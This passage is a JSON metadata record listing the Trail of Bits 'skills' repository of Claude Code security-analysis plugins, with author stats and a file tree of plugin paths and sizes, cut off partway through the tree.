{
  "author": {
    "id": "trailofbits",
    "display_name": "Trail of Bits",
    "type": "Organization",
    "avatar_url": "https://avatars.githubusercontent.com/u/2314423?v=4",
    "url": "https://github.com/trailofbits",
    "bio": "More code: binary lifters @lifting-bits, blockchain @crytic, forks @trail-of-forks ",
    "stats": {
      "total_marketplaces": 1,
      "total_plugins": 21,
      "total_commands": 10,
      "total_skills": 49,
      "total_stars": 2211,
      "total_forks": 173
    }
  },
  "marketplaces": [
    {
      "name": "trailofbits",
      "version": null,
      "description": "Claude Code plugins from Trail of Bits for enhanced AI-assisted security analysis and development",
      "owner_info": {
        "name": "Trail of Bits",
        "email": "opensource@trailofbits.com"
      },
      "keywords": [],
      "repo_full_name": "trailofbits/skills",
      "repo_url": "https://github.com/trailofbits/skills",
      "repo_description": "Trail of Bits Claude Code skills for security research, vulnerability detection, and audit workflows",
      "homepage": "",
      "signals": {
        "stars": 2211,
        "forks": 173,
        "pushed_at": "2026-01-29T23:05:36Z",
        "created_at": "2026-01-14T18:23:21Z",
        "license": "CC-BY-SA-4.0"
      },
      "file_tree": [
        {
          "path": ".claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": ".claude-plugin/marketplace.json",
          "type": "blob",
          "size": 7700
        },
        {
          "path": "plugins",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/ask-questions-if-underspecified",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/ask-questions-if-underspecified/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/ask-questions-if-underspecified/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 323
        },
        {
          "path": "plugins/ask-questions-if-underspecified/README.md",
          "type": "blob",
          "size": 766
        },
        {
          "path": "plugins/ask-questions-if-underspecified/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/ask-questions-if-underspecified/skills/ask-questions-if-underspecified",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/ask-questions-if-underspecified/skills/ask-questions-if-underspecified/SKILL.md",
          "type": "blob",
          "size": 3987
        },
        {
          "path": "plugins/audit-context-building",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/audit-context-building/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/audit-context-building/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 312
        },
        {
          "path": "plugins/audit-context-building/README.md",
          "type": "blob",
          "size": 2015
        },
        {
          "path": "plugins/audit-context-building/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/audit-context-building/commands/audit-context.md",
          "type": "blob",
          "size": 517
        },
        {
          "path": "plugins/audit-context-building/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/audit-context-building/skills/audit-context-building",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/audit-context-building/skills/audit-context-building/SKILL.md",
          "type": "blob",
          "size": 9563
        },
        {
          "path": "plugins/audit-context-building/skills/audit-context-building/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/audit-context-building/skills/audit-context-building/resources/COMPLETENESS_CHECKLIST.md",
          "type": "blob",
          "size": 1880
        },
        {
          "path": "plugins/audit-context-building/skills/audit-context-building/resources/FUNCTION_MICRO_ANALYSIS_EXAMPLE.md",
          "type": "blob",
          "size": 18173
        },
        {
          "path": "plugins/audit-context-building/skills/audit-context-building/resources/OUTPUT_REQUIREMENTS.md",
          "type": "blob",
          "size": 2449
        },
        {
          "path": "plugins/building-secure-contracts",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 413
        },
        {
          "path": "plugins/building-secure-contracts/README.md",
          "type": "blob",
          "size": 8315
        },
        {
          "path": "plugins/building-secure-contracts/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/algorand-vulnerability-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/algorand-vulnerability-scanner/SKILL.md",
          "type": "blob",
          "size": 8886
        },
        {
          "path": "plugins/building-secure-contracts/skills/algorand-vulnerability-scanner/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/algorand-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md",
          "type": "blob",
          "size": 12636
        },
        {
          "path": "plugins/building-secure-contracts/skills/audit-prep-assistant",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/audit-prep-assistant/SKILL.md",
          "type": "blob",
          "size": 9688
        },
        {
          "path": "plugins/building-secure-contracts/skills/cairo-vulnerability-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/cairo-vulnerability-scanner/SKILL.md",
          "type": "blob",
          "size": 9690
        },
        {
          "path": "plugins/building-secure-contracts/skills/cairo-vulnerability-scanner/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/cairo-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md",
          "type": "blob",
          "size": 21282
        },
        {
          "path": "plugins/building-secure-contracts/skills/code-maturity-assessor",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/code-maturity-assessor/SKILL.md",
          "type": "blob",
          "size": 7079
        },
        {
          "path": "plugins/building-secure-contracts/skills/code-maturity-assessor/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/code-maturity-assessor/resources/ASSESSMENT_CRITERIA.md",
          "type": "blob",
          "size": 9876
        },
        {
          "path": "plugins/building-secure-contracts/skills/code-maturity-assessor/resources/EXAMPLE_REPORT.md",
          "type": "blob",
          "size": 7595
        },
        {
          "path": "plugins/building-secure-contracts/skills/code-maturity-assessor/resources/REPORT_FORMAT.md",
          "type": "blob",
          "size": 726
        },
        {
          "path": "plugins/building-secure-contracts/skills/cosmos-vulnerability-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/cosmos-vulnerability-scanner/SKILL.md",
          "type": "blob",
          "size": 10000
        },
        {
          "path": "plugins/building-secure-contracts/skills/cosmos-vulnerability-scanner/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/cosmos-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md",
          "type": "blob",
          "size": 22675
        },
        {
          "path": "plugins/building-secure-contracts/skills/guidelines-advisor",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/guidelines-advisor/SKILL.md",
          "type": "blob",
          "size": 8486
        },
        {
          "path": "plugins/building-secure-contracts/skills/guidelines-advisor/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/guidelines-advisor/resources/ASSESSMENT_AREAS.md",
          "type": "blob",
          "size": 7997
        },
        {
          "path": "plugins/building-secure-contracts/skills/guidelines-advisor/resources/DELIVERABLES.md",
          "type": "blob",
          "size": 2338
        },
        {
          "path": "plugins/building-secure-contracts/skills/guidelines-advisor/resources/EXAMPLE_REPORT.md",
          "type": "blob",
          "size": 8433
        },
        {
          "path": "plugins/building-secure-contracts/skills/secure-workflow-guide",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/secure-workflow-guide/SKILL.md",
          "type": "blob",
          "size": 6531
        },
        {
          "path": "plugins/building-secure-contracts/skills/secure-workflow-guide/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/secure-workflow-guide/resources/EXAMPLE_REPORT.md",
          "type": "blob",
          "size": 7374
        },
        {
          "path": "plugins/building-secure-contracts/skills/secure-workflow-guide/resources/WORKFLOW_STEPS.md",
          "type": "blob",
          "size": 3058
        },
        {
          "path": "plugins/building-secure-contracts/skills/solana-vulnerability-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/solana-vulnerability-scanner/SKILL.md",
          "type": "blob",
          "size": 11245
        },
        {
          "path": "plugins/building-secure-contracts/skills/solana-vulnerability-scanner/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/solana-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md",
          "type": "blob",
          "size": 20338
        },
        {
          "path": "plugins/building-secure-contracts/skills/substrate-vulnerability-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/substrate-vulnerability-scanner/SKILL.md",
          "type": "blob",
          "size": 9550
        },
        {
          "path": "plugins/building-secure-contracts/skills/substrate-vulnerability-scanner/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/substrate-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md",
          "type": "blob",
          "size": 24903
        },
        {
          "path": "plugins/building-secure-contracts/skills/token-integration-analyzer",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/token-integration-analyzer/SKILL.md",
          "type": "blob",
          "size": 12557
        },
        {
          "path": "plugins/building-secure-contracts/skills/token-integration-analyzer/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/token-integration-analyzer/resources/ASSESSMENT_CATEGORIES.md",
          "type": "blob",
          "size": 12990
        },
        {
          "path": "plugins/building-secure-contracts/skills/token-integration-analyzer/resources/REPORT_TEMPLATES.md",
          "type": "blob",
          "size": 3289
        },
        {
          "path": "plugins/building-secure-contracts/skills/ton-vulnerability-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/ton-vulnerability-scanner/SKILL.md",
          "type": "blob",
          "size": 11726
        },
        {
          "path": "plugins/building-secure-contracts/skills/ton-vulnerability-scanner/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/building-secure-contracts/skills/ton-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md",
          "type": "blob",
          "size": 18564
        },
        {
          "path": "plugins/burpsuite-project-parser",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/burpsuite-project-parser/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/burpsuite-project-parser/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 331
        },
        {
          "path": "plugins/burpsuite-project-parser/README.md",
          "type": "blob",
          "size": 3301
        },
        {
          "path": "plugins/burpsuite-project-parser/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/burpsuite-project-parser/commands/burp-search.md",
          "type": "blob",
          "size": 512
        },
        {
          "path": "plugins/burpsuite-project-parser/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/burpsuite-project-parser/skills/SKILL.md",
          "type": "blob",
          "size": 12494
        },
        {
          "path": "plugins/constant-time-analysis",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/constant-time-analysis/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/constant-time-analysis/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 244
        },
        {
          "path": "plugins/constant-time-analysis/README.md",
          "type": "blob",
          "size": 12756
        },
        {
          "path": "plugins/constant-time-analysis/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/constant-time-analysis/commands/ct-check.md",
          "type": "blob",
          "size": 555
        },
        {
          "path": "plugins/constant-time-analysis/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/README.md",
          "type": "blob",
          "size": 3893
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/SKILL.md",
          "type": "blob",
          "size": 9948
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/compiled.md",
          "type": "blob",
          "size": 4108
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/javascript.md",
          "type": "blob",
          "size": 4449
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/kotlin.md",
          "type": "blob",
          "size": 6784
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/php.md",
          "type": "blob",
          "size": 4831
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/python.md",
          "type": "blob",
          "size": 5261
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/ruby.md",
          "type": "blob",
          "size": 5391
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/swift.md",
          "type": "blob",
          "size": 8194
        },
        {
          "path": "plugins/constant-time-analysis/skills/constant-time-analysis/references/vm-compiled.md",
          "type": "blob",
          "size": 10409
        },
        {
          "path": "plugins/culture-index",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 181
        },
        {
          "path": "plugins/culture-index/README.md",
          "type": "blob",
          "size": 2307
        },
        {
          "path": "plugins/culture-index/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/SKILL.md",
          "type": "blob",
          "size": 11864
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/anti-patterns.md",
          "type": "blob",
          "size": 8318
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/conversation-starters.md",
          "type": "blob",
          "size": 9781
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/interview-trait-signals.md",
          "type": "blob",
          "size": 8335
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/motivators.md",
          "type": "blob",
          "size": 6729
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/patterns-archetypes.md",
          "type": "blob",
          "size": 6538
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/primary-traits.md",
          "type": "blob",
          "size": 12828
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/secondary-traits.md",
          "type": "blob",
          "size": 8540
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/references/team-composition.md",
          "type": "blob",
          "size": 6298
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates/burnout-report.md",
          "type": "blob",
          "size": 3234
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates/comparison-report.md",
          "type": "blob",
          "size": 3351
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates/hiring-profile.md",
          "type": "blob",
          "size": 4040
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates/individual-report.md",
          "type": "blob",
          "size": 2589
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates/predicted-profile.md",
          "type": "blob",
          "size": 5718
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/templates/team-report.md",
          "type": "blob",
          "size": 3168
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/analyze-team.md",
          "type": "blob",
          "size": 5250
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/coach-manager.md",
          "type": "blob",
          "size": 8999
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/compare-profiles.md",
          "type": "blob",
          "size": 6390
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/define-hiring-profile.md",
          "type": "blob",
          "size": 7742
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/detect-burnout.md",
          "type": "blob",
          "size": 6250
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/extract-from-pdf.md",
          "type": "blob",
          "size": 3890
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/interpret-individual.md",
          "type": "blob",
          "size": 5809
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/interview-debrief.md",
          "type": "blob",
          "size": 7681
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/mediate-conflict.md",
          "type": "blob",
          "size": 10146
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/plan-onboarding.md",
          "type": "blob",
          "size": 9447
        },
        {
          "path": "plugins/culture-index/skills/interpreting-culture-index/workflows/predict-from-interview.md",
          "type": "blob",
          "size": 8166
        },
        {
          "path": "plugins/differential-review",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/differential-review/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/differential-review/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 317
        },
        {
          "path": "plugins/differential-review/README.md",
          "type": "blob",
          "size": 4061
        },
        {
          "path": "plugins/differential-review/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/differential-review/commands/diff-review.md",
          "type": "blob",
          "size": 532
        },
        {
          "path": "plugins/differential-review/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/differential-review/skills/differential-review",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/differential-review/skills/differential-review/SKILL.md",
          "type": "blob",
          "size": 6590
        },
        {
          "path": "plugins/differential-review/skills/differential-review/adversarial.md",
          "type": "blob",
          "size": 5062
        },
        {
          "path": "plugins/differential-review/skills/differential-review/methodology.md",
          "type": "blob",
          "size": 6738
        },
        {
          "path": "plugins/differential-review/skills/differential-review/patterns.md",
          "type": "blob",
          "size": 6999
        },
        {
          "path": "plugins/differential-review/skills/differential-review/reporting.md",
          "type": "blob",
          "size": 7006
        },
        {
          "path": "plugins/dwarf-expert",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/dwarf-expert/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/dwarf-expert/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 261
        },
        {
          "path": "plugins/dwarf-expert/README.md",
          "type": "blob",
          "size": 1466
        },
        {
          "path": "plugins/dwarf-expert/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/dwarf-expert/skills/dwarf-expert",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/dwarf-expert/skills/dwarf-expert/SKILL.md",
          "type": "blob",
          "size": 4921
        },
        {
          "path": "plugins/dwarf-expert/skills/dwarf-expert/reference",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/dwarf-expert/skills/dwarf-expert/reference/coding.md",
          "type": "blob",
          "size": 3020
        },
        {
          "path": "plugins/dwarf-expert/skills/dwarf-expert/reference/dwarfdump.md",
          "type": "blob",
          "size": 6600
        },
        {
          "path": "plugins/dwarf-expert/skills/dwarf-expert/reference/readelf.md",
          "type": "blob",
          "size": 559
        },
        {
          "path": "plugins/entry-point-analyzer",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/entry-point-analyzer/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/entry-point-analyzer/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 444
        },
        {
          "path": "plugins/entry-point-analyzer/README.md",
          "type": "blob",
          "size": 2587
        },
        {
          "path": "plugins/entry-point-analyzer/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/entry-point-analyzer/commands/entry-points.md",
          "type": "blob",
          "size": 424
        },
        {
          "path": "plugins/entry-point-analyzer/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/SKILL.md",
          "type": "blob",
          "size": 9609
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/cosmwasm.md",
          "type": "blob",
          "size": 5477
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/move-aptos.md",
          "type": "blob",
          "size": 3464
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/move-sui.md",
          "type": "blob",
          "size": 3533
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/solana.md",
          "type": "blob",
          "size": 4824
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/solidity.md",
          "type": "blob",
          "size": 5071
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/ton.md",
          "type": "blob",
          "size": 5086
        },
        {
          "path": "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/vyper.md",
          "type": "blob",
          "size": 3934
        },
        {
          "path": "plugins/firebase-apk-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/firebase-apk-scanner/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/firebase-apk-scanner/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 349
        },
        {
          "path": "plugins/firebase-apk-scanner/README.md",
          "type": "blob",
          "size": 2904
        },
        {
          "path": "plugins/firebase-apk-scanner/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/firebase-apk-scanner/commands/scan-apk.md",
          "type": "blob",
          "size": 415
        },
        {
          "path": "plugins/firebase-apk-scanner/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/firebase-apk-scanner/skills/firebase-apk-scanner",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/firebase-apk-scanner/skills/firebase-apk-scanner/SKILL.md",
          "type": "blob",
          "size": 6849
        },
        {
          "path": "plugins/firebase-apk-scanner/skills/firebase-apk-scanner/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/firebase-apk-scanner/skills/firebase-apk-scanner/references/vulnerabilities.md",
          "type": "blob",
          "size": 21033
        },
        {
          "path": "plugins/fix-review",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/fix-review/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/fix-review/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 437
        },
        {
          "path": "plugins/fix-review/README.md",
          "type": "blob",
          "size": 3148
        },
        {
          "path": "plugins/fix-review/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/fix-review/commands/fix-review.md",
          "type": "blob",
          "size": 626
        },
        {
          "path": "plugins/fix-review/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/fix-review/skills/fix-review",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/fix-review/skills/fix-review/SKILL.md",
          "type": "blob",
          "size": 7621
        },
        {
          "path": "plugins/fix-review/skills/fix-review/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/fix-review/skills/fix-review/references/bug-detection.md",
          "type": "blob",
          "size": 8399
        },
        {
          "path": "plugins/fix-review/skills/fix-review/references/finding-matching.md",
          "type": "blob",
          "size": 7262
        },
        {
          "path": "plugins/fix-review/skills/fix-review/references/report-parsing.md",
          "type": "blob",
          "size": 7802
        },
        {
          "path": "plugins/insecure-defaults",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/insecure-defaults/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/insecure-defaults/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 264
        },
        {
          "path": "plugins/insecure-defaults/README.md",
          "type": "blob",
          "size": 1630
        },
        {
          "path": "plugins/insecure-defaults/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/insecure-defaults/skills/insecure-defaults",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/insecure-defaults/skills/insecure-defaults/SKILL.md",
          "type": "blob",
          "size": 5251
        },
        {
          "path": "plugins/insecure-defaults/skills/insecure-defaults/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/insecure-defaults/skills/insecure-defaults/references/examples.md",
          "type": "blob",
          "size": 10673
        },
        {
          "path": "plugins/modern-python",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/modern-python/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/modern-python/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 352
        },
        {
          "path": "plugins/modern-python/README.md",
          "type": "blob",
          "size": 2326
        },
        {
          "path": "plugins/modern-python/hooks",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/modern-python/hooks/hooks.json",
          "type": "blob",
          "size": 348
        },
        {
          "path": "plugins/modern-python/hooks/intercept-legacy-python.bats",
          "type": "blob",
          "size": 8738
        },
        {
          "path": "plugins/modern-python/hooks/intercept-legacy-python.sh",
          "type": "blob",
          "size": 3965
        },
        {
          "path": "plugins/modern-python/hooks/test_helper.bash",
          "type": "blob",
          "size": 2465
        },
        {
          "path": "plugins/modern-python/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/modern-python/skills/modern-python",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/modern-python/skills/modern-python/SKILL.md",
          "type": "blob",
          "size": 10015
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/dependabot.md",
          "type": "blob",
          "size": 1800
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/migration-checklist.md",
          "type": "blob",
          "size": 3071
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/pep723-scripts.md",
          "type": "blob",
          "size": 5134
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/prek.md",
          "type": "blob",
          "size": 5951
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/pyproject.md",
          "type": "blob",
          "size": 5694
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/ruff-config.md",
          "type": "blob",
          "size": 5476
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/security-setup.md",
          "type": "blob",
          "size": 6504
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/testing.md",
          "type": "blob",
          "size": 5214
        },
        {
          "path": "plugins/modern-python/skills/modern-python/references/uv-commands.md",
          "type": "blob",
          "size": 4653
        },
        {
          "path": "plugins/property-based-testing",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/property-based-testing/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/property-based-testing/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 248
        },
        {
          "path": "plugins/property-based-testing/README.md",
          "type": "blob",
          "size": 1397
        },
        {
          "path": "plugins/property-based-testing/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/README.md",
          "type": "blob",
          "size": 3215
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/SKILL.md",
          "type": "blob",
          "size": 5087
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references/design.md",
          "type": "blob",
          "size": 5537
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references/generating.md",
          "type": "blob",
          "size": 5900
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references/libraries.md",
          "type": "blob",
          "size": 2931
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references/refactoring.md",
          "type": "blob",
          "size": 5638
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references/reviewing.md",
          "type": "blob",
          "size": 5795
        },
        {
          "path": "plugins/property-based-testing/skills/property-based-testing/references/strategies.md",
          "type": "blob",
          "size": 2998
        },
        {
          "path": "plugins/semgrep-rule-creator",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-creator/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-creator/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 212
        },
        {
          "path": "plugins/semgrep-rule-creator/README.md",
          "type": "blob",
          "size": 1517
        },
        {
          "path": "plugins/semgrep-rule-creator/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-creator/commands/semgrep-rule.md",
          "type": "blob",
          "size": 613
        },
        {
          "path": "plugins/semgrep-rule-creator/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-creator/skills/semgrep-rule-creator",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/SKILL.md",
          "type": "blob",
          "size": 8403
        },
        {
          "path": "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/references/quick-reference.md",
          "type": "blob",
          "size": 4602
        },
        {
          "path": "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/references/workflow.md",
          "type": "blob",
          "size": 5926
        },
        {
          "path": "plugins/semgrep-rule-variant-creator",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
